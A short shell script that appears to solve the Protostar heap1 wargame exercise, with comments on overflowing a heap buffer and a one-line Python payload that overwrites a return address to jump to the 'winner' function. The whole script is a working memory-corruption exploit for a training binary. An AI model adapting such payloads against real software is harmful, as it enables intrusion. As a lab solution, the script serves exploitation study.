#!/bin/sh
# We can control how malloc works since input
# is not sanitized properly. It'll grab the next 8 bytes on the stack
# carelessly, allowing us to overwrite EBP of the function.
# We break at main to determine where the stack is and find how far it
# goes down. We know that the return addr is somewhere before the null byte,
# so doing some tinkering we discover it at the addr in the first pack call.
# Then we overwrite that function with the function of winner, and we're done.
/opt/protostar/bin/heap1 $(python -c 'from struct import pack;print "A"*20+pack("I",0xbffffc9c)+" "+pack("I",0x8048494)')

